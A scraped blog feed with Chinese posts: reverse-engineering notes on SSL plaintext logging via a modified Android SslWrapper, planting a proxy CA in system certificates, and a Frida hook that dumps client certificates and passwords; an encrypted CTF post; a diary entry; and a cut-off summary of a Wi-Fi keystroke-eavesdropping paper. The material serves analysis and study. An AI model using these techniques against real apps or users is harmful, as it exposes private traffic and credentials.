class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">write</span>(bytearry, int1, int2);</span><br><span class="line">    <span class="title class_">SSLstackwrite</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;那我们咋找其他办法呢？首先，我们先快速定位 SSL 相关的函数，通过使用 Objection 搜索所有与 socket 相关的类（<code>objection -g packagename explore; android class search socket</code>），并利用 objection 在执行注入时 <code>-c hook.txt</code>，hook.txt 包含要执行的命令，从而 trace 这些类，从而快速定位到这些类在代码中的位置。最后定位到两个关键函数：<code>com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read()</code> （数据接收）与 <code>com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write()</code>（数据发送）的自吐函数。</p><p>&emsp;之后，我们就要寻思如何输出（1）数据内容；（2）地址信息；（3）函数调用栈。</p><p>&emsp;针对数据内容，进一步调研后发现，<code>com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read()</code> （数据接收）与 <code>com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write()</code>（数据发送）会调用 SSL 成员所在类的函数，即 <code>ssl.read</code> 与 <code>ssl.write</code>，跟踪之后发现 <code>ssl</code> 实际上是 <code>sslWrapper</code> 类型的的对象，因此，我们最终在 <code>sslWrapper</code> 中实现源码修改，从而完成沙箱的自吐。</p><p>&emsp;针对地址信息，使用 objection 的 WallBreaker 插件查看 sslWrapper 类的实例信息，发现其多个成员（例如 <code>handshakeCallbacks</code> 成员）的值与 socket 成员起到的作用一致（上文中使用 <code>this.socket.value.getRemoteSocketAddress()</code> 获取地址信息），因此此问题解决。</p><p>&emsp;针对打印调用栈的问题，与 <code>未加密</code> 数据的处理方法相同。最终，修改的源代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SslWrapper.java</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">write</span><span class="params">(FileDescriptor fd, <span class="type">byte</span>[] buf, <span class="type">int</span> offset, <span class="type">int</span> len, <span class="type">int</span> timeoutMillis)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">byte</span>[] input = <span class="keyword">new</span> <span class="title class_">byte</span>[len];</span><br><span class="line">        System.arraycopy(buf, offset, input, <span class="number">0</span>, len);</span><br><span class="line">        <span class="type">String</span> <span class="variable">inputString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(input);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取 Log.e 函数</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">logClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            logClass = <span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;android.util.Log&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">loge</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            loge = logClass.getMethod(<span class="string">&quot;e&quot;</span>, String.class, String.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 打印目的地址信息</span></span><br><span class="line">            loge.invoke(<span class="literal">null</span>, <span class="string">&quot;wd2711SSLrequest&quot;</span>, <span class="string">&quot;SSL is =&gt; &quot;</span> + <span class="built_in">this</span>.handshakeCallbacks.toString());</span><br><span class="line">            <span class="comment">// 打印 SSL 要加密的信息</span></span><br><span class="line">            loge.invoke(<span class="literal">null</span>, <span class="string">&quot;wd2711SSLrequest&quot;</span>, <span class="string">&quot;buffer is =&gt; &quot;</span> + inputString);</span><br><span class="line">            <span class="comment">// 打印函数调用栈</span></span><br><span class="line">            <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;wd2711SSLrequest&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 原始函数，调用 SSL_write native 层的代码</span></span><br><span class="line">    NativeCrypto.SSL_write(ssl, fd, handshakeCallbacks, buf, offset, len, timeoutMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;<code>最终编译出不带 root 的系统，运行后 Log 会存放到某个 txt 中</code>。这是因为，我们可以使用 crypto_filter_aosp，注入到 ROM，并监控我们想要的 app，之后，将 android 的 SslWrapper.java 修改为上述代码，之后，输出的 log 就可以存放到某个 txt 中。</p><h3 id="使用沙箱辅助中间人抓包"><a href="#使用沙箱辅助中间人抓包" class="headerlink" title="使用沙箱辅助中间人抓包"></a>使用沙箱辅助中间人抓包</h3><p>&emsp;前面所提出的技术，例如 r0capture 使用 frida 进行 SSL 层的抓包，修改系统源码实现 SSL 层的抓包（沙箱），但是对于采用自定义 SSL 框架进行通信的方式来说就行不通了。这类自定义的 SSL 框架（webview，小程序，flutter）不是依赖系统进行收发数据的，而是通过 App 自己进行收发数据的。此时，就需要进行中间人抓包。</p><p>&emsp;但是有很多对抗中间人抓包的方式，例如安卓自己的 API （Proxy.NO_PROXY 对抗 Wifi 代理抓包，getNetWorkCapabilities 检测 VPN 代理），服务器校验客户端，客户端校验服务器的方式。</p><p>&emsp;如何对上述手段进行反制呢？我们可以通过修改系统源码，生成沙箱来进行反制。</p><h4 id="HTTPS-抓包"><a href="#HTTPS-抓包" class="headerlink" title="HTTPS 抓包"></a>HTTPS 抓包</h4><p>&emsp;中间人抓包（只说对于 HTTPS）：对于需要 CA 认证成功才能通信的协议，例如 HTTPS，如果我们使用简单的 wifi 代理与 vpn 代理 （系统设置）来设置中间人，那么在访问网页的时候就会显示<code>您的链接不是私密链接</code>警告。为了解决这个问题，我们可以使用其他代理软件，例如 charles，并将其相应的证书文件放到<code>用户信任的凭据空间</code>与<code>安卓系统信任的凭据空间</code>中。这需要使用 mount 指令将系统分区设置为可写后，才能进行放置，也就是说，需要 root 权限。</p><p>&emsp;那么对于非 root 环境如何做呢？答案是：<code>将 charles 证书文件转换为安卓系统能识别的形式，并放置到系统证书在源码中的对应目录下即可。</code></p><p>（1）将证书转为安卓系统能识别的形式。安装 charles 证书，这样的话证书会被放置在用户信任的凭据空间中，这样就变成了安卓系统能识别的形式，即<code>xxx.0</code>。</p><p>（2）将证书放置到系统证书在源码下的对应目录。对应目录为<code>/system/ca-certificates/google/files/</code>，移动后确认证书所属用户/用户组/对应权限都与其他证书一致（<code>ls -alit</code>）即可。</p><p>&emsp;放到系统信任的凭据空间之后，即使是抓取 HTTPs 数据，也不会报警告。</p><h4 id="对抗服务器校验客户端和-SSL-pinning-的问题"><a href="#对抗服务器校验客户端和-SSL-pinning-的问题" class="headerlink" title="对抗服务器校验客户端和 SSL pinning 的问题"></a>对抗服务器校验客户端和 SSL pinning 的问题</h4><p>&emsp;服务器校验客户端，指的是服务器在与客户端进行通信时，会在握手阶段验证客户端使用证书的公钥。但是当使用中间人进行抓包时，与服务器进行通信的是 charles 抓包软件，其使用的证书就不是服务端认证的证书文件。<code>具体来说，手机安装 app 后，会一并安装 app 自带的证书，服务器就要验证这个证书。代理软件一般是没有这个 app 自带的证书的，所以服务器验证客户端就会失败</code>。</p><p>&emsp;绕过思路也比较简单：<code>在 app 中找到相应的证书文件与对应密码（打开证书的密码），转为 P12 格式的证书，最终导入到代理软件中，以欺骗服务器</code>。</p><p>&emsp;客户端（手机、代理软件）想要与特定证书与服务器通信，就要用密码打开证书。开发者通常使用 KeyStore(InputStream, char[]) 函数使用密码打开证书，我们可以 hook 该函数，从而 dump 证书文件与相应密码。具体 hook 脚本如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// saveClientCer.js</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">    <span class="comment">// KeyStore.load(InputStream, char[])</span></span><br><span class="line">    <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.io.InputStream&quot;</span>, <span class="string">&quot;[C&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1</span>)&#123;</span><br><span class="line">        <span class="comment">// 打印堆栈</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">        <span class="comment">// arg1 为证书密钥</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? <span class="title class_">StringClass</span>.$new(arg1) : <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (arg0) &#123;</span><br><span class="line">            <span class="comment">// 将证书（加密的证书）保存到 /sdcard/Download/ 目录下</span></span><br><span class="line">            <span class="keyword">var</span> file = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>).$new(<span class="string">&quot;/sdcard/Download/&quot;</span> + <span class="title class_">String</span>(arg0) + <span class="string">&quot;.p12&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> out = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(file);</span><br><span class="line">            <span class="keyword">var</span> r;</span><br><span class="line">            <span class="keyword">while</span> ((r = arg0.<span class="title function_">read</span>(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                out.<span class="title function_">write</span>(buffer, <span class="number">0</span>, r);</span><br><span class="line">            &#125;</span><br><span class="line">            out.<span class="title function_">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0, arg1);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>&emsp;因此，我们可以 hook 到证书文件与密码，使用 keyStore Explorer 查看证书文件，并用密码进行解密，就可以查看证书的各种信息（书中说可以查看到证书私钥，我存疑）。之后，将证书文件导入到代理软件（例如 charles）（我理解应该也导入密码），就可以进行上网。</p><h2 id="0x08-收费直播间逆向分析"><a href="#0x08-收费直播间逆向分析" class="headerlink" title="0x08 收费直播间逆向分析"></a>0x08 收费直播间逆向分析</h2><h2 id="0x09-会员制非法应用破解"><a href="#0x09-会员制非法应用破解" class="headerlink" title="0x09 会员制非法应用破解"></a>0x09 会员制非法应用破解</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Frida逆向与协议分析-3&quot;&gt;&lt;a href=&quot;#Frida逆向与协议分析-3&quot; class=&quot;headerlink&quot; title=&quot;Frida逆向与协议分析-3&quot;&gt;&lt;/a&gt;Frida逆向与协议分析-3&lt;/h1&gt;&lt;p&gt;&amp;emsp;frida逆向与协议分析第三部分，主要就是Android源码编译、沙箱等。&lt;/p&gt;</summary>
    
    
    
    <category term="re-book" scheme="https://wd-2711.tech/categories/re-book/"/>
    
    
  </entry>
  
  <entry>
    <title>N1CTF-2023</title>
    <link href="https://wd-2711.tech/2023/10/21/N1CTF-2023/"/>
    <id>https://wd-2711.tech/2023/10/21/N1CTF-2023/</id>
    <published>2023-10-21T03:07:00.000Z</published>
    <updated>2023-10-22T08:45:40.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4291535d607e769a7f44db08ecf171aff5e82cf5e1a6dbac4a0d43e7e1288c4d">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d51c56116b5bab9e45baeea968e6dd944707ea6a5b481faee30b12db312aeff2b8fe1dc3fec9baba996efd048c6df6dbe1a80138920fb6b0f49839787021eb0efa144c03367e825fbffae3fd9ac8691c0aa3512b16833eae95b678fd5347ce40a22b6b7c92bc492671f01da6a3cbfc8def34719437efdf420f92dca41c3db9c9349861e5f07743d66d58832a512caf3983a29a212f80f03b2fe8ab117840b6b877bf40c62014bb4715e7ad9cb9029202a0a44fcec52b9add24865ece6ea75a99d373b083dbe3da5629e96ae13c8194b16df05987085b9bb184d6ef9e60b06e8a895a84cb48a936a6e0b4c52d829613143a1268ebd4317c066f8f4ca49ae861ab31c6231f00649891399c0ab9543043f7470ba598f2c5fe48754a19ce7a6d785003378104c1c8b24c93a20a081345488565ab5ce853b248db1811ce6156a29415c61ce387a35fa7d9736bb4bfa7feea8c1aa58cca0ee79340b1998c52697f06a4d6f4d969ca85968121f346a5e549933a80d01709c330318d3862b71f87a09f017429364c2fb86c0b67ad75347b69931482ed5a79f8ec28e2f164922878be3c2e6d2b080181fb5c18a5cfe9a23e42c0d0e3338494c73c2558c50036b01dec861a40949010f388096656999be852f946eff617ce3cb60b92ca73c3e6cfc55fdfae298ab3aa2f51138fe3a14fa26245742fc4dcec6fa8758bd9882bc2a4bf8db6e63d05d8d9050b565ee045278090044ec210b5d5d2f53f52172cef856656a0cbcd9f3c7fc452fde7b83c52450a296ea9c6db46ea741d2e66b2bf49771e1764c63c74f5ec3a2b3f7fb87d98f6369f7e10baa2132801f030708d79b8408f3470658d3f2d441a9e0386ed120792266ad0fcf8006e21d59a3680f543a7454a34c56de48f05be00717568316ef73b01f7d11049ac7bb43cdd37cdc58ef598862772e778381382ca32032e07c172e1b18bb7ff2846aa31300ed8d1ebed03ef3901c0aed5c39b4b09be541c0bdde84d821abb051c39131f49b46b61f93cd2d2d6011d32926a2c433abcaed7f8793c988b19230de840e9a594ef7e6c179722d2b3248533e54aa7bac217f478e9c5ca15037bebb8100639334476520e7267013b6ebb99f6c439d3c9d328ebadeffc5a1081526396e262f5acabd4c1854792b2ff17b088bd4d526feab3545cf55f2126a38b5293193fc90c47d0c344f270b748867dc76d615f83ea27ec85b14311e3462861ed0a2f084ba6e4b3f712c4978f71a06d6be25309ba916cbfe8061e08dee6ac4c5d0325ed9c5b3be98a4752b146b263d09044c854746f6b53d80ecfa894da1d275b56fb405a6f2279a4b95a992af09448d47e84494ae84f002ab2fa8d60dba997bd665a557088401b8d7ee9222573600901be9062de8a66aa54c6c71e1475c8a47d5f64b8c75b07eeb96776862660a81beba2c440426f64cbef8ee523526424f5bb9b38706e6056b487e5c1afd6e73a6bde5f7bddf4c7c279748b150942df702318811ca3f59ab96c8797b8d4561b20da56c6490e7273ad6e5ec9dc000a7784be0a621b594d90563cdfdb862f8e88b0edff1bb78951e13c52937aaaa9f84e027508a270d5ab050b252951aebc8fd5eb6583d2a4e9e0db13cf3cb53ab55fd4218606eeff5db03073be9e9ad393dbd41dc2233ad1815ba918510a9a91892ed1f31c238c3622a82c78aa62463de144abc3c923f5abf8206e9295f179884168287c18e34954c4931b873c8309e28e2350631af432785e29c67748cbba30b3f48cd376ea874cb9ee35938a79e7bbbe0f61574d06012313547a708694cfff96340d3eb381feded2d7b22b924272e80a92b92e5b1fc215cdcc1c284d7da1b9ffd0e4f9a439b91e5f989aa01dd430bfa29f4749e162e73e5580612402fc68cf7bbd5cf1970c5d606093870abd76e8bfb242bdd9c90ffee936f655e824511e6bdf2ae4210c7687c63436968bed4e6d9c1641d33f64507629943b17e85943000d1bbc9482d7872bfe78838c02075bd84617c0f5b4b343f877f887aa9b3eeddb237134a2c36b0011bf65c7f1c2e3d562c97d22cbb679577f63a6d60d29284d08c6349d7244cd7646b74efd294b1b45dcba1ce49e70a6e2902346e4dc217e9eb5baa5061e228760ec64e5af52a649853bf01751c65468d0f372371d961be9a74294838c7165d1f8cfe967b7a5f245a999eced9e619683a78b1de75c20f6460f6edf11e44194fbf40d66508ce97d258cddad89a77e329cce04aa9e362deb32e3959734ad74ae59376134552d64439438e5d9153227a54b5959df1e78a83b67be384630e1b647eb503a4728347b471e3ebac660cec35d0953a83b9682efad5a0177768232e2fe69ccc81debd9a978fa499d2ca621d9ffbff489d73c9d0c80e8c46f19cd5afeaca71ae2a09e2b2766f7f03c496610a498761e3bb56668a0426b1ef88a413ef8a6d8730f2a26ff6b182d21339f6d1e0d1b6a67d3fd7c3c00cd044ad8043961b5f9adf27140c639404d606c8e2aee3a47cf195dfd5d8d35cc5e8ed5a73fa13ad0a2474e3b406b04db69f1d4227e8c02d26dd51c52bb3380e5bd232279b3c65c90a279d819c120da91a528fe0e5406a2e1c7db28588d856f0c812dcb480cd25ee1f05bee5255e7640f7c80fd49b3324e99246483e8637cf6755bb1897dcb4618084e06d8c6b3f0239c2b6f45bf1c7add1f91caa6f1b0e4cfceaa3b4eb8ca0e6e1f38e3fb976e6361c9f562e9911085881610df12c0beb20e94938937e62292e3ecdeb6ed896a3ddff1e2a864b091fc267faf2c60d6b5a154feaabed14468d2e8d60d37ef3a6875c40c224f4027466b4daf40258335e5ae5cd7a2348ff2c37f46248123bcd895265e7988c1c6589376348396ed5c8f7a50087b3a3b5b84bf848dcae25e3b4f314e3336f23dcd95abf96e8970757170854b90da421682fe6055bb2266dfc7603630b7f663f50567aa68c3bf5f4e5651b8e49c8f93e80fbc14edce47e85e1c02519e02a8aa2f55b1f9345a8d1eafb40fc0756cdc99b8400f3b799d2482ddfadef6ca7c41027b42880f75733ee52a2a7e5a6f688e9dfd0cb3d03285d676f49e328505444b5cf60ad742aa9bcda3a051d2acb4ad125aa7f7e21cf6b62ab5493b2594711c68eebc4d15d3c7f2177dbad2c7fb9a29e545f09362626a788dd8fd3ba78bec559257e815fd30648799a7d8d189a428f427296396dc6359478bb3d909215ebef4c815592ddbcb9a595ec223c50e28b613fd9c4b344b7e9cba6f941752037af843e60e2a704006ab5a50b02001bd7b4824d2b8cabd1f943f90ee9de894ecef96ad457ec0a429951cee9581087aba6244ca1f7f222f08e411f200427f818c36f1da422e10e67f135cbc4d456772dc5bc4b03e230e40848cdae03554f159e320f5a24d8a9d7382ceace84cce209bb48c0c94c99f842e29faee9049851300c89d4d3755b857c7f9f592040c2b26bf64b7293767670c6f770569122f2dee7940cd851a651be2f43f18e924901daf37818d2867b4e4c2f1eac7be880161d78baa528ca2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>recentlyThink-4</title>
    <link href="https://wd-2711.tech/2023/10/19/recentlyThink-4/"/>
    <id>https://wd-2711.tech/2023/10/19/recentlyThink-4/</id>
    <published>2023-10-18T16:03:40.000Z</published>
    <updated>2023-10-19T05:34:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="最近"><a href="#最近" class="headerlink" title="最近"></a>最近</h1><p>&emsp;最近的生活就是一直在跟着计划走，虽然从来没按时完成过hhh。十月一之前一直期盼着假期到来，因为坤哥辉哥旭哥假期说找我玩，然后我们计划着租车围着巢湖转几天。最后其实假期还挺好的，一共一块玩了5天，第一天是租了个2室1厅的民宿。第二天去了风之谷自然农场：</p><span id="more"></span><p><img src="/images/recentlyThink-4/image-20231019130502196.png" alt="image-20231019130502196" style="zoom:67%;" /></p><p>&emsp;浮桥很舒服，草地也很舒服，只不过没有足够的钱住在这里（一晚1800）。后面几天就是车展、园博园各种旅游地。</p><p>&emsp;假期的时候我们四个人都很省，舍不得花钱，可能是他们三个工作了，也要成家立业了。有时候也真的挺感慨的，从前那种无忧无虑的生活再也没了，从前虽然很穷，手里只有几十块钱，也不会担心。附一张十几年前游玩图（图中为坤哥）：</p><p><img src="/images/recentlyThink-4/image-20231019131216881.png" alt="image-20231019131216881" style="zoom:67%;" /></p><p>&emsp;现在更多的想法是如何赚更多的钱，让自己在出去玩时更快乐。但是有了钱，真的能让自己更快乐么？豪车美酒，难道不会更会让自己更空虚么？我也不知道答案。</p><p><img src="/images/recentlyThink-4/image-20231019131436147.png" alt="image-20231019131436147" style="zoom:67%;" /></p><p>&emsp;说回正题，国庆回来之后，我的学习状态感觉就不是很好，拿到ms的实习之后，愈发感觉自己有点飘了。此时是焦虑与飘的结合体，焦虑是愁论文怎么发，飘是觉得自己行了。其实想想，拿到这个机会更多的只是运气。</p><p>&emsp;最近也发现自己有好多不足，一是逆向做的题不够，见的不够广。二是眼高手低，无法静心。三是没有毅力，减肥喊了好多天了，昨天还去吃了牛排自助…</p><p>&emsp;针对一，我觉得还是得把攻防世界的题目刷起来；针对二，更多的得是自己要意识到，学无止境；三是通过吃一顿饭就给猪猪转50块钱的方式，引入外部约束力。</p><p>&emsp;<code>莫图虚名修术业，勿以浮沙筑高台</code>。希望要时刻提醒自己这一点。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;最近&quot;&gt;&lt;a href=&quot;#最近&quot; class=&quot;headerlink&quot; title=&quot;最近&quot;&gt;&lt;/a&gt;最近&lt;/h1&gt;&lt;p&gt;&amp;emsp;最近的生活就是一直在跟着计划走，虽然从来没按时完成过hhh。十月一之前一直期盼着假期到来，因为坤哥辉哥旭哥假期说找我玩，然后我们计划着租车围着巢湖转几天。最后其实假期还挺好的，一共一块玩了5天，第一天是租了个2室1厅的民宿。第二天去了风之谷自然农场：&lt;/p&gt;</summary>
    
    
    
    <category term="杂记" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Password-Stealing-without-Hacking</title>
    <link href="https://wd-2711.tech/2023/10/18/Password-Stealing-without-Hacking/"/>
    <id>https://wd-2711.tech/2023/10/18/Password-Stealing-without-Hacking/</id>
    <published>2023-10-18T06:17:03.000Z</published>
    <updated>2023-10-19T04:41:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping"><a href="#WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping" class="headerlink" title="WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping"></a>WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>&emsp;Wi-Fi 的非接触式特性可以泄露隐私，但针对 Wi-Fi CSI（信道状态信息）的攻击需要攻击 Wi-Fi 硬件，这非常困难。为此，我们提出了 WiKI-Eve 技术，无需攻击即可<code>窃听智能手机上的按键操作</code>。 WiKI-Eve 利用了 Wi-Fi 硬件提供的 BFI（波束成形反馈信息）功能：<code>由于 BFI 以明文形式从智能手机传输到 AP（路由器），因此它可以被切换到监听模式的 Wi-Fi 设备偷听</code>。WiKI-Eve 还创新了对抗性学习方案，使其推理能够泛化到未见过的场景。结果表明，WiKI-Eve 对单个击键的推理准确率达到 88.9%，对窃取移动应用程序（例如微信）密码的准确率高达 65.8%。</p><p>&emsp;没找到代码呜呜…</p><span id="more"></span><h2 id="本文贡献"><a href="#本文贡献" class="headerlink" title="本文贡献"></a>本文贡献</h2><p>&emsp;当前窃取手机密码需要好多前提：（1）窃听设备靠近受害设备；（2）流氓软件被植入受害设备；（3）窃听内容具有语言结构。</p><p>&emsp;在所有侧信道中，Wi-Fi CSI（信道状态信息）似乎无需上述前提。 本质上，由于击键会影响无线通道（如下图所示），因此可推断输入的密码。 </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018150244446.png" alt="image-20231018150244446" style="zoom:67%;" /></p><p>&emsp;但是，尽管 CSI 很早就被 Wi-Fi 硬件黑客攻击，但到目前为止，<code>只有少数此类硬件被黑客攻击，而 Wi-Fi 标准却在不断变化</code>。因此，基于 CSI 的旁道攻击无法跟上技术的发展。</p><p>&emsp;从 WiFi 5 开始，WiFi 硬件搭载了 BFI（波束成形反馈信息），即模拟 CSI 的压缩数字版本，其以明文形式控制帧。<code>BFI 将下行链路信道状态反馈回接入点 (AP)，以指导 AP 波束成形（AP信号指向移动设备，从而使得信号更好）</code>。尽管只考虑了与 AP 侧有关的下行链路 CSI 的一部分，但击键可影响 Wi-Fi 天线，使得 BFI 包含有关击键的足够信息。因此，任何能够监听 Wi-Fi 流量的设备都可以免费获得 BFI，从而获得击键。</p><p>&emsp;但是，我们要解决两个问题：（1）密码缺乏自然语言中的语言结构（例如单词结构和字母出现频率）来作为先验信息，因此，密码推断要么依赖于独立的击键特征，要么利用两次击键之间的转换特征。但是，<code>这些特征具有很强的环境依赖性，由此推理方法很难泛化</code>。尽管监督学习技术可以通过包含足够训练数据的数据集来解决此问题，但由于智能手机型号多样化和人类打字习惯，标记数据集非常困难。（2） BFI 可能是稀疏的，即在信号中很少出现 BFI。</p><p>&emsp; WiKI-Eve 通过窃听按键引起的 <code>BFI 变化</code>来窃取密码。针对问题（1），使用识别单个击键的方法，<code>利用具有自然分割为输入的深度学习模型来以消除基于规则的分割和环境干扰引入的噪声，利用对抗性学习来提取单个击键相关的特征</code>。这种跨域训练利用<code>有限的训练数据将击键推理泛化</code>。针对问题（2），设计了稀疏恢复算法来解决数据不足问题。本文贡献如下：</p><ul><li>利用明文 BFI，利用 Wi-Fi 设备窃听密码。</li><li>利用对抗性学习来消除环境依赖性，使 WiKI-Eve 的模型可推广到未见过的场景。</li><li>稀疏恢复算法来解决BFI的稀疏性问题，处理训练击键推理模型时的数据缺乏问题。</li></ul><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="攻击场景及方式"><a href="#攻击场景及方式" class="headerlink" title="攻击场景及方式"></a>攻击场景及方式</h3><p>&emsp;我们考虑这样一种场景：受害者 Bob 使用他的移动设备连接到没有密码保护的 Wi-Fi 接入点 (AP)， Bob连接到AP上网后，需要访问受密码保护的敏感账户（例如在线支付），这使得他成为Eve发起的攻击目标。 从这里开始，我们的方法与现有的方法不同，现有的方法要么需要恶意 AP 来欺骗 Bob 使用其服务，要么需要设置额外的 Wi-Fi 通信链接来窃取Bob 的打字。</p><p>&emsp;WiKI-Eve 的攻击方法利用配备网络接口卡 (NIC) 的笔记本电脑。其中，Bob 和 AP 之间的 Wi-Fi 链路（CSI）被用来窃取密码，如下图 (a) 所示，WiKI-Eve 进行了创新，将我们的方法称为 o-IKI（无意中窃听带内击键推理），不再需要破解 Wi-Fi NIC 并欺骗 Bob 将其用作 AP。 </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018161212127.png" alt="image-20231018161212127" 